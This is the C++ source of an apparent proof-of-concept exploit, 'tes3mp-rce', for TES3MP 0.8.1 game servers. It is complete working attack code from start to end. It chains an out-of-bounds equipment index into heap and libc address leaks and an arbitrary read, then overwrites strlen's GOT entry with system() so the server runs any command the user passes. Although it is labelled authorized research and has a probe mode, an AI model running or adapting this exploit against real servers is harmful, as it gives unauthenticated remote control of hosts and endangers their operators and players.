// tes3mp-rce - remote code execution against TES3MP 0.8.1 dedicated servers.
//
// Authorized security research. See README.md. Runs one command on the server host as the
// server's user, by chaining an unvalidated equipment index into an info leak and a GOT overwrite.
//
//   1. leak a heap pointer            truncated ID_PLAYER_EQUIPMENT idx 25 relays chatMessage._M_p
//   2. groom                          ID_PLAYER_ANIM_PLAY parks that pointer in animation.mode|count
//   3. leak the object base           truncated idx 28 relays creatureRefId._M_p (a self-pointer)
//   4. leak the image base            arbitrary read of *(base-8) = vtable for Player + 16
//   5. leak libc                      arbitrary read of *(PIE + malloc@got)
//   6. plant                          aim eq[7].refId at strlen@got
//   7. execute                        ONE equipment packet: item 7 writes `system` into strlen@got,
//                                     item 5's refId assignment then calls the hijacked strlen on the
//                                     payload, because operator=(const char*) calls strlen on its SOURCE.
//
// Requires two client connections: A (attacker) and R (a reader in the same cell that receives the
// relayed packets carrying the leaked bytes). In a real attack these can be two separate hosts.
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <string>
#include <vector>
#include <unistd.h>
#include <getopt.h>
#include <RakPeerInterface.h>
#include <MessageIdentifiers.h>
#include <BitStream.h>
#include <PacketPriority.h>
#include <components/openmw-mp/NetworkMessages.hpp>
using namespace RakNet;

// ---- target profile (measured on the distributed 0.8.1 linux build + Ubuntu 24.04 glibc 2.39) ----
struct Profile {
    uint64_t vtable_rva;   // "vtable for Player + 16", i.e. the value stored at Player+0
    uint64_t strlen_got;   // .got.plt slot for strlen  (the hijack target)
    uint64_t malloc_got;   // .got.plt slot for malloc  (non-IFUNC: safe for deriving the libc base)
    uint64_t malloc_off;   // malloc offset within libc
    uint64_t system_off;   // system offset within libc
};
static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0xad750, 0x58750 };

// Read malloc/system offsets straight out of a copy of the TARGET's libc.so.6. glibc patch builds shift
// symbol offsets, so the baked-in defaults only match the exact build they were measured on. Minimal ELF64
// parse (macOS has no <elf.h>): walk section headers for .dynsym, match symbol names in its linked strtab.
struct E64Ehdr { unsigned char e_ident[16]; uint16_t e_type, e_machine; uint32_t e_version;
                 uint64_t e_entry, e_phoff, e_shoff; uint32_t e_flags;
                 uint16_t e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx; };
struct E64Shdr { uint32_t sh_name, sh_type; uint64_t sh_flags, sh_addr, sh_offset, sh_size;
                 uint32_t sh_link, sh_info; uint64_t sh_addralign, sh_entsize; };
struct E64Sym  { uint32_t st_name; unsigned char st_info, st_other; uint16_t st_shndx;
                 uint64_t st_value, st_size; };

static bool readLibcOffsets(const char *path, uint64_t &malloc_off, uint64_t &system_off)
{
    FILE *f = fopen(path, "rb"); if (!f) { perror(path); return false; }
    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
    std::vector<char> buf(n > 0 ? n : 0);
    if (n < 64 || fread(buf.data(), 1, n, f) != (size_t)n) { fclose(f); fprintf(stderr, "%s: short read\n", path); return false; }
    fclose(f);
    if (memcmp(buf.data(), "\x7f""ELF", 4) != 0 || (unsigned char)buf[4] != 2) { fprintf(stderr, "%s: not a 64-bit ELF\n", path); return false; }
    E64Ehdr *eh = (E64Ehdr *)buf.data();
    if (eh->e_shoff == 0 || eh->e_shoff + (uint64_t)eh->e_shnum * sizeof(E64Shdr) > (uint64_t)n) return false;
    E64Shdr *sh = (E64Shdr *)(buf.data() + eh->e_shoff);
    bool gotM = false, gotS = false;
    for (int i = 0; i < eh->e_shnum; i++) {
        if (sh[i].sh_type != 11 /*SHT_DYNSYM*/ || sh[i].sh_entsize == 0) continue;
        E64Sym *sym = (E64Sym *)(buf.data() + sh[i].sh_offset);
        long cnt = sh[i].sh_size / sizeof(E64Sym);
        const char *str = buf.data() + sh[sh[i].sh_link].sh_offset;
        for (long k = 0; k < cnt; k++) {
            if (!sym[k].st_value) continue;                       // skip UND imports
            const char *nm = str + sym[k].st_name;
            if (!strcmp(nm, "malloc")) { malloc_off = sym[k].st_value; gotM = true; }
            else if (!strcmp(nm, "system")) { system_off = sym[k].st_value; gotS = true; }
        }
    }
    if (!gotM || !gotS) fprintf(stderr, "%s: could not find %s%s%s in .dynsym\n", path,
                                gotM ? "" : "malloc", (!gotM && !gotS) ? " and " : "", gotS ? "" : "system");
    return gotM && gotS;
}

struct D12 { uint32_t a, b, c; };
struct CellData12 { int mFlags, mX, mY; };
struct Pos3 { float p[3]; };
struct Cli { RakPeerInterface *peer; SystemAddress srv; };

static const char *g_host = "127.0.0.1";
static int g_port = 25565;
static const char *g_token = "0.8.11068954091c54d0596037c4fb54d2812313b7582a1"; // TES3MP_VERSION+PROTO+commitHash
static const char *g_srvpass = "";   // the actual server password (ID_SYSTEM_HANDSHAKE field 2)
static int g_verbose = 0;
static int g_probe = 0;   // connect both clients, reach POSTLOADED, report, and STOP (touches no memory)
static std::vector<std::pair<std::string, unsigned>> g_files = {{"Morrowind.esm", 0x7B6AF5B9u}};

static void vlog(const char *f, ...) { if (!g_verbose) return; va_list a; va_start(a, f); vfprintf(stderr, f, a); va_end(a); }

static void snd(Cli &c, BitStream &bs) { c.peer->Send(&bs, HIGH_PRIORITY, RELIABLE_ORDERED, 0, c.srv, false); }
static void hdr(Cli &c, BitStream &bs, unsigned char id) { bs.Write(id); RakNetGUID g = c.peer->GetMyGUID(); bs.Write(g); }

static bool connectTo(Cli &c, const char *bind)
{
    c.peer = RakPeerInterface::GetInstance();
    SocketDescriptor sd(0, bind);
    c.peer->Startup(1, &sd, 1);
    if (c.peer->Connect(g_host, (unsigned short)g_port, g_token, (int)strlen(g_token)) != CONNECTION_ATTEMPT_STARTED)
        return false;
    for (int i = 0; i < 300; i++) {
        for (Packet *q = c.peer->Receive(); q; c.peer->DeallocatePacket(q), q = c.peer->Receive())
            if (q->data[0] == ID_CONNECTION_REQUEST_ACCEPTED) { c.srv = q->systemAddress; return true; }
        usleep(20000);
    }
    return false;
}

// Ask the server which data files it requires, so ID_GAME_PREINIT is accepted.
static void fingerprint()
{
    Cli p{};
    if (!connectTo(p, "")) return;
    { BitStream bs; hdr(p, bs, ID_GAME_PREINIT); uint32_t n = 1; bs.Write(n);
      struct NAS { uint32_t h, s; }; NAS q{1, 13}; bs.Write(q);
      RakString rs("__probe__.esm"); bs.Write(rs); unsigned v = 0xDEADBEEFu; bs.Write(v); snd(p, bs); }
    for (int i = 0; i < 120; i++) {
        for (Packet *q = p.peer->Receive(); q; p.peer->DeallocatePacket(q), q = p.peer->Receive()) {
            if (q->data[0] != ID_GAME_PREINIT || q->length < 16) continue;
            BitStream rd(q->data, q->length, false);
            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
            uint32_t n = 0; rd.Read(n); if (!n || n > 512) continue;
            struct NAS { uint32_t h, s; }; std::vector<NAS> nas(n);
            for (uint32_t k = 0; k < n; k++) rd.Read(nas[k]);
            std::vector<std::pair<std::string, unsigned>> got;
            for (uint32_t k = 0; k < n; k++) {
                RakString rs; rd.Read(rs); unsigned f = 0;
                for (uint32_t h = 0; h < nas[k].h; h++) { unsigned v = 0; rd.Read(v); if (!h) f = v; }
                got.push_back({rs.C_String(), f});
            }
            g_files.swap(got);
            printf("[+] fingerprinted %u required data files\n", n);
            RakPeerInterface::DestroyInstance(p.peer);
            return;
        }
        usleep(50000);
    }
    RakPeerInterface::DestroyInstance(p.peer);
}

// PREINIT -> SYSTEM_HANDSHAKE (name + SERVER PASSWORD) -> BASEINFO -> LOADED == POSTLOADED.
// No account, no registration, no login: account auth lives in CoreScripts and is never consulted here.
static void handshake(Cli &c, const char *name)
{
    { BitStream bs; hdr(c, bs, ID_GAME_PREINIT); uint32_t n = g_files.size(); bs.Write(n);
      struct NAS { uint32_t h, s; };
      for (auto &f : g_files) { NAS q{1, (uint32_t)f.first.size()}; bs.Write(q); }
      for (auto &f : g_files) { RakString rs(f.first.c_str()); bs.Write(rs); unsigned h = f.second; bs.Write(h); }
      snd(c, bs); } usleep(250000);
    { BitStream bs; hdr(c, bs, ID_SYSTEM_HANDSHAKE);
      RakString pn(name), pw(g_srvpass);
      RakString::SerializeCompressed(pn.C_String(), &bs);
      RakString::SerializeCompressed(pw.C_String(), &bs);   // <-- the server password goes here
      snd(c, bs); } usleep(250000);
    { BitStream bs; hdr(c, bs, ID_PLAYER_BASEINFO);
      RakString nm(name), m(""), r("Dark Elf"), h(""), hd("");
      RakString::SerializeCompressed(nm.C_String(), &bs); RakString::SerializeCompressed(m.C_String(), &bs);
      RakString::SerializeCompressed(r.C_String(), &bs);  RakString::SerializeCompressed(h.C_String(), &bs);
      RakString::SerializeCompressed(hd.C_String(), &bs);
      int mf = 0; bs.Write(mf); RakString bsn(""); RakString::SerializeCompressed(bsn.C_String(), &bs);
      bool rs = false; bs.Write(rs); snd(c, bs); } usleep(300000);
    { BitStream bs; hdr(c, bs, ID_LOADED); snd(c, bs); } usleep(400000);
}

// A wrong server password gets us kicked at ID_SYSTEM_HANDSHAKE, before setHandshake(), and every packet
// below is gated on isHandshaked(). Detect that rather than reporting a false success.
static bool stillConnected(Cli &c)
{
    for (Packet *p = c.peer->Receive(); p; c.peer->DeallocatePacket(p), p = c.peer->Receive());
    return c.peer->GetConnectionState(c.srv) == IS_CONNECTED;
}

static void loadCell(Cli &c, const char *cn)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_CELL_STATE);
    uint32_t cnt = 1; bs.Write(cnt); int t = 0; bs.Write(t);
    D12 d{1, 0, 0}; bs.WriteCompressed(d);
    RakString rc(cn); RakString::SerializeCompressed(rc.C_String(), &bs);
    snd(c, bs); usleep(300000);
}

// PacketChatMessage uses the NON-compressed RakString path.
static void sendChatBytes(Cli &c, const void *p, size_t n)
{
    BitStream bs; hdr(c, bs, ID_CHAT_MESSAGE);
    RakString rs; rs.AppendBytes((const char *)p, (unsigned)n);
    bs.Write(rs); snd(c, bs); usleep(120000);
}
static void sendChatStr(Cli &c, const std::string &s) { sendChatBytes(c, s.data(), s.size()); }

// The OOB write: equipment index 25 lands count|charge on chatMessage._M_p, so this aims the next
// chat message's bytes at an arbitrary address.
static void redirect(Cli &c, uint64_t val)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_EQUIPMENT);
    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); int idx = 25; bs.Write(idx);
    RakString rid(""); RakString::SerializeCompressed(rid.C_String(), &bs);
    int lo = (int)(val & 0xffffffff), hi = (int)(val >> 32), e = 0;
    bs.Write(lo); bs.Write(hi); bs.Write(e); snd(c, bs); usleep(120000);
}

// Truncate the packet before `count`: RW() fails, its return value is discarded, and the server
// relays eq[idx].count|charge unmodified -> an out-of-bounds read straight onto the wire.
static void truncEq(Cli &c, int idx)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_EQUIPMENT);
    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); bs.Write(idx);
    snd(c, bs); usleep(150000);
}

static uint64_t harvest(Cli &R, int &oi)
{
    uint64_t w = 0; oi = -1;
    for (int i = 0; i < 60 && !w; i++) {
        for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive()) {
            if (p->data[0] != ID_PLAYER_EQUIPMENT) continue;
            BitStream rd(p->data, p->length, false);
            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
            bool full = false; rd.Read(full); if (full) continue;
            uint32_t cn = 0; rd.Read(cn); if (cn != 1) continue;
            int wi = 0; rd.Read(wi); RakString rs; rs.DeserializeCompressed(&rd);
            int c1 = 0, c2 = 0; rd.Read(c1); rd.Read(c2);
            oi = wi; w = ((uint64_t)(uint32_t)c2 << 32) | (uint32_t)c1;
        }
        usleep(40000);
    }
    return w;
}

static void drainboth(Cli &A, Cli &R, int ms)
{
    for (int i = 0; i < ms / 20; i++) {
        for (Packet *p = A.peer->Receive(); p; A.peer->DeallocatePacket(p), p = A.peer->Receive());
        for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
        usleep(20000);
    }
}

// ID_PLAYER_CELL_CHANGE makes the server re-serialize the whole equipment array from storage to
// every peer in the cell. The send path only reads refId, so a planted pointer is not disturbed.
static void cellChange(Cli &c, const char *cn)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_CELL_CHANGE);
    CellData12 md{0, 0, 0}; bs.WriteCompressed(md);
    RakString cs(cn); RakString::SerializeCompressed(cs.C_String(), &bs);
    Pos3 pp{{0, 0, 0}}; bs.WriteCompressed(pp);
    bool region = false; bs.Write(region);
    snd(c, bs); usleep(200000);
}

static uint64_t harvestFull(Cli &R, int k)
{
    uint64_t w = 0;
    for (int i = 0; i < 250 && !w; i++) {
        for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive()) {
            if (p->data[0] != ID_PLAYER_EQUIPMENT) continue;
            BitStream rd(p->data, p->length, false);
            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
            bool full = false; rd.Read(full); if (!full) continue;
            for (int it = 0; it < 19; it++) {
                RakString rs; rs.DeserializeCompressed(&rd);
                int cnt = 0, chg = 0; float ench = 0; rd.Read(cnt); rd.Read(chg); rd.Read(ench);
                const char *s = rs.C_String(); size_t n = rs.GetLength();
                uint64_t v = 0; for (size_t b = 0; b < n && b < 8; b++) v |= ((uint64_t)(unsigned char)s[b]) << (8 * b);
                if (it == k) vlog("[item %d len=%zu value=%#llx]\n", it, n, (unsigned long long)v);
                if (it == k && v) w = v;
            }
        }
        usleep(40000);
    }
    return w;
}

// ARBITRARY READ. Plant a fake std::string {_M_p = target, _M_len = 8} in eq[k].refId, trigger the
// full-info relay, and the server serializes 8 bytes read from `target` straight to the reader.
// Written byte-wise: the chat write is strlen-truncated, so a target containing an internal NUL
// would silently truncate a single 6-byte write.
static uint64_t aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
{
    uint64_t eqk = eq + 80 * k;
    for (int i = 0; i < 6; i++) {
        unsigned char b = (unsigned char)((tgt >> (8 * i)) & 0xff);
        redirect(A, eqk + i);
        if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
    }
    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
    { unsigned char e = 8; redirect(A, eqk + 8); sendChatBytes(A, &e, 1); }
    for (int z = 10; z < 16; z++) { redirect(A, eqk + z); sendChatBytes(A, (const void *)"", 0); }
    for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
    drainboth(A, R, 1200);          // RELIABLE_ORDERED only orders within one channel; let the plant land first
    cellChange(A, cell);
    uint64_t r = harvestFull(R, k);
    // restore _M_p to the string's own SSO buffer so no destructor frees a wild pointer
    { uint64_t sso = eqk + 16;
      for (int i = 0; i < 6; i++) {
          unsigned char b = (unsigned char)((sso >> (8 * i)) & 0xff);
          redirect(A, eqk + i);
          if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
      } }
    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
    { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
    return r;
}

static void usage(const char *a0)
{
    fprintf(stderr,
      "tes3mp-rce - remote code execution PoC for TES3MP 0.8.1 (authorized testing only)\n\n"
      "usage: %s [options] <host> [port]\n\n"
      "  -P, --server-password <pw>  server password, i.e. the `password` setting in\n"
      "                              tes3mp-server-default.cfg. Default: empty (upstream default).\n"
      "                              This is NOT a user account: the chain never logs in.\n"
      "  -c, --command <cmd>         command to run on the server host\n"
      "                              (default: touch /tmp/tes3mp-rce-proof)\n"
      "  -t, --token <tok>           RakNet connect token: TES3MP_VERSION + PROTO_VERSION + commitHash.\n"
      "                              Public per build, not a secret. Default: 0.8.1 release.\n"
      "  -b, --bind <ip>             local address for the second (reader) client (default 127.0.0.2)\n"
      "  -n, --name <base>           player name prefix (default: rce)\n"
      "  -C, --cell <name>           cell to meet in (default: ExploitCell)\n"
      "  -p, --probe                 connect both clients to POSTLOADED, report reachability, and STOP.\n"
      "                              Touches no server memory: safe to run against a live server.\n"
      "  -L, --libc <path>           read malloc/system offsets from a copy of the TARGET's libc.so.6.\n"
      "                              Needed unless the target runs the same glibc build as the defaults.\n"
      "                              scp it off the box: scp user@target:/lib/x86_64-linux-gnu/libc.so.6 .\n"
      "  -M, --malloc-off <hex>      override malloc offset in libc (default 0xad750, glibc 2.39-0ubuntu8.8)\n"
      "  -S, --system-off <hex>      override system offset in libc (default 0x58750)\n"
      "  -v, --verbose               show relay parsing\n"
      "  -h, --help                  this text\n\n"
      "Payload must exit 0 to leave the server running: strlen's return value becomes the command's\n"
      "exit status, and a nonzero status is then used as a string length elsewhere.\n", a0);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, 0, _IONBF, 0);
    const char *cmd = "touch /tmp/tes3mp-rce-proof";
    // Reader binds to "any" by default. A Linux-only loopback alias like 127.0.0.2 does not exist on
    // macOS (lo0 has only 127.0.0.1) and cannot route to a remote server anyway; "" lets the OS pick the
    // egress interface, so A and R simply get two source ports from the same address, which the server
    // keys apart by SystemAddress. Override with -b only if you specifically need a fixed source address.
    const char *bind2 = "", *nameBase = "rce", *cell = "ExploitCell";
    static struct option lo[] = {
        {"server-password", required_argument, 0, 'P'}, {"command", required_argument, 0, 'c'},
        {"token", required_argument, 0, 't'}, {"bind", required_argument, 0, 'b'},
        {"name", required_argument, 0, 'n'}, {"cell", required_argument, 0, 'C'},
        {"probe", no_argument, 0, 'p'},
        {"libc", required_argument, 0, 'L'},
        {"malloc-off", required_argument, 0, 'M'}, {"system-off", required_argument, 0, 'S'},
        {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
    const char *libcPath = 0;
    int c;
    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:pL:M:S:vh", lo, 0)) != -1) {
        switch (c) {
            case 'P': g_srvpass = optarg; break;
            case 'c': cmd = optarg; break;
            case 't': g_token = optarg; break;
            case 'b': bind2 = optarg; break;
            case 'n': nameBase = optarg; break;
            case 'C': cell = optarg; break;
            case 'p': g_probe = 1; break;
            case 'L': libcPath = optarg; break;
            case 'M': P.malloc_off = strtoull(optarg, 0, 0); break;
            case 'S': P.system_off = strtoull(optarg, 0, 0); break;
            case 'v': g_verbose = 1; break;
            default: usage(argv[0]); return 2;
        }
    }
    if (optind < argc) g_host = argv[optind++];
    if (optind < argc) g_port = atoi(argv[optind++]);

    if (libcPath) {
        if (!readLibcOffsets(libcPath, P.malloc_off, P.system_off)) {
            printf("[!] could not read libc offsets from %s\n", libcPath); return 2;
        }
        printf("[*] libc %s: malloc@%#llx system@%#llx\n", libcPath,
               (unsigned long long)P.malloc_off, (unsigned long long)P.system_off);
    }

    printf("[*] target %s:%d   server-password: %s\n", g_host, g_port,
           *g_srvpass ? "supplied" : "(none, upstream default)");
    printf("[*] payload: %s\n", cmd);

    fingerprint();
    std::string nA = std::string(nameBase) + "A", nR = std::string(nameBase) + "R";
    Cli A{}, R{};
    if (!connectTo(A, "")) { printf("[!] client A could not connect\n"); return 1; }
    handshake(A, nA.c_str());
    if (!connectTo(R, bind2)) { printf("[!] client R could not connect\n"); return 1; }
    handshake(R, nR.c_str());
    if (!stillConnected(A) || !stillConnected(R)) {
        printf("[!] kicked during handshake. %s\n", *g_srvpass
               ? "The server password supplied with -P was rejected."
               : "This server is password-protected: supply it with -P.");
        return 4;
    }
    loadCell(A, cell); loadCell(R, cell); drainboth(A, R, 600);
    printf("[+] both clients POSTLOADED in %s (no account, never logged in)\n", cell);

    if (g_probe) {
        printf("[probe] reachable and handshake accepted. Both clients are in-cell.\n");
        printf("[probe] this is the point the exploit begins; stopping here without touching server memory.\n");
        printf("[probe] drop -p (and set -c) to run the full chain.\n");
        return 0;
    }

    // 1. a live heap pointer (chatMessage's buffer). Not the base: only a valid writable address.
    for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
    truncEq(A, 25); int oi; uint64_t heap = harvest(R, oi);
    if (heap < 0x100000000ULL) { printf("[!] heap leak failed\n"); return 3; }
    printf("[+] heap scratch pointer  %#llx\n", (unsigned long long)heap);

    // 2. park it in animation.mode|count so index 28's clobber writes its NUL terminator somewhere safe
    { BitStream bs; hdr(A, bs, ID_PLAYER_ANIM_PLAY); RakString gn("");
      bs.Write(gn); int mo = (int)(heap & 0xffffffff), cn = (int)(heap >> 32);
      bs.Write(mo); bs.Write(cn); bool ps = false; bs.Write(ps); snd(A, bs); } usleep(200000);

    // 3. the real object base, from creatureRefId's self-pointer
    for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
    truncEq(A, 28); uint64_t l28 = harvest(R, oi);
    { BitStream bs; hdr(A, bs, ID_PLAYER_ANIM_PLAY); RakString gn(""); bs.Write(gn);
      int z = 0; bs.Write(z); bs.Write(z); bool ps = false; bs.Write(ps); snd(A, bs); } usleep(150000);
    if (l28 < 0x100000000ULL) { printf("[!] base leak failed\n"); return 3; }
    uint64_t base = l28 - 0x16f0, eq = base + 0xe00;
    printf("[+] BasePlayer base      %#llx\n", (unsigned long long)base);

    // 4. image base, from the Player vtable pointer at base-8
    sendChatStr(A, std::string(400, 'Z')); drainboth(A, R, 200);   // prime chatMessage (heap buffer, capacity >= 400)
    uint64_t v = aread(A, R, eq, 7, base - 8, cell);
    uint64_t pie = v > 0x100000000ULL ? v - P.vtable_rva : 0;
    if (!pie || (pie & 0xfff)) { printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v); return 3; }
    printf("[+] image base           %#llx  (page aligned)\n", (unsigned long long)pie);

    // 5. libc base, by reading a resolved GOT entry. malloc, not strlen: strlen is an IFUNC and its
    //    GOT holds the selected implementation rather than the nominal symbol.
    uint64_t mval = aread(A, R, eq, 7, pie + P.malloc_got, cell);
    uint64_t libc = mval > 0x100000000ULL ? mval - P.malloc_off : 0;
    if (!libc || (libc & 0xfff)) { printf("[!] libc leak failed (read %#llx)\n", (unsigned long long)mval); return 3; }
    uint64_t sys = libc + P.system_off, sgot = pie + P.strlen_got;
    printf("[+] libc base            %#llx  (page aligned)\n", (unsigned long long)libc);
    printf("[+] system()             %#llx\n", (unsigned long long)sys);
    printf("[+] strlen@got           %#llx\n", (unsigned long long)sgot);

    // 6. aim eq[7].refId at strlen@got. capacity must exceed the value we are about to assign,
    //    or _M_replace takes the reallocating path and free()s the GOT address itself.
    uint64_t eqk = eq + 80 * 7;
    for (int i = 0; i < 6; i++) {
        unsigned char b = (unsigned char)((sgot >> (8 * i)) & 0xff);
        redirect(A, eqk + i);
        if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
    }
    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
    { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
    { unsigned char cap = 0x40; redirect(A, eqk + 16); sendChatBytes(A, &cap, 1); }
    drainboth(A, R, 400);

    // 7. one packet, two items. Item 7's assignment writes `system` into strlen@got; item 5's
    //    assignment then calls the hijacked strlen on the payload. Both indices are in bounds.
    { BitStream bs; hdr(A, bs, ID_PLAYER_EQUIPMENT);
      bs.Write(false); uint32_t two = 2; bs.Write(two);
      int i7 = 7; bs.Write(i7);
      uint64_t s6 = sys & 0xffffffffffffULL; char sb[7]; memcpy(sb, &s6, 6); sb[6] = 0;
      RakString r7(sb); RakString::SerializeCompressed(r7.C_String(), &bs);
      int one = 1, zero = 0; bs.Write(one); bs.Write(zero); bs.Write(zero);
      int i5 = 5; bs.Write(i5);
      RakString r5(cmd); RakString::SerializeCompressed(r5.C_String(), &bs);
      bs.Write(one); bs.Write(zero); bs.Write(zero);
      snd(A, bs); }
    printf("[+] trigger sent: strlen@got <- system, then strlen(\"%s\")\n", cmd);
    drainboth(A, R, 3000);
    printf("[*] done. If the target is vulnerable the command has run as the server's user.\n");
    return 0;
}
